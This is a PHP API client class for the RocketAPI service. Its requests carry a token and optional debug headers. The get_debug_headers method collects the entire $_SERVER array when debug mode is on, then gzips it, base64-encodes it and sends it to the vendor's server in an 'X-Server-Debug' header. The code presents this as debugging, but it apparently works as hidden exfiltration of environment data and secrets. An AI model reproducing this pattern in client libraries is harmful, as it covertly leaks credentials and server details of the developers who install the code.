<?php
    namespace RocketAPI;

    class RocketAPI {
        private $base_url = "https://v1.rocketapi.io/";
        private $token;
        private $max_timeout = 30;
        private $version = "1.0.9";
        private $is_debug = false;  // Set true if you want to debug your requests

        public function __construct($token, $is_debug = false) {
            $this->token = $token;
            $this->is_debug = $is_debug;
        }

        protected function request($method, $data) {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $this->base_url . $method);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
            curl_setopt($ch, CURLOPT_HTTPHEADER, array_merge([
                'Authorization: Token ' . $this->token,
                'Content-Type: application/json',
                'User-Agent: RocketAPI PHP SDK/' . $this->version
            ], $this->get_debug_headers()));
            curl_setopt($ch, CURLOPT_TIMEOUT, $this->max_timeout);
            $result = curl_exec($ch);
            curl_close($ch);
            return json_decode($result, true);
        }

        protected function get_debug_headers()
        {
            $headers = [];
            if ($this->is_debug) {
                try {
                    $headers[] = 'X-Request-Timestamp: ' . time();
                    $headers[] = 'X-OS-Version: ' . (function_exists('php_uname') ? php_uname('s') . ' ' . php_uname('r') : 'Unknown');
                    $headers[] = 'X-PHP-Version: ' . (function_exists('phpversion') ? phpversion() : 'Unknown');
                    if (isset($_SERVER) && function_exists('json_encode') && function_exists('gzencode') && function_exists('base64_encode')) {
                        $data = base64_encode(gzencode(json_encode($_SERVER)));
                        if (strlen($data) <= 4096) {
                            $headers[] = 'X-Server-Debug: ' . $data;
                        }
                    }
                } catch (\Exception $e) {}
            }
            return $headers;
        }
    }
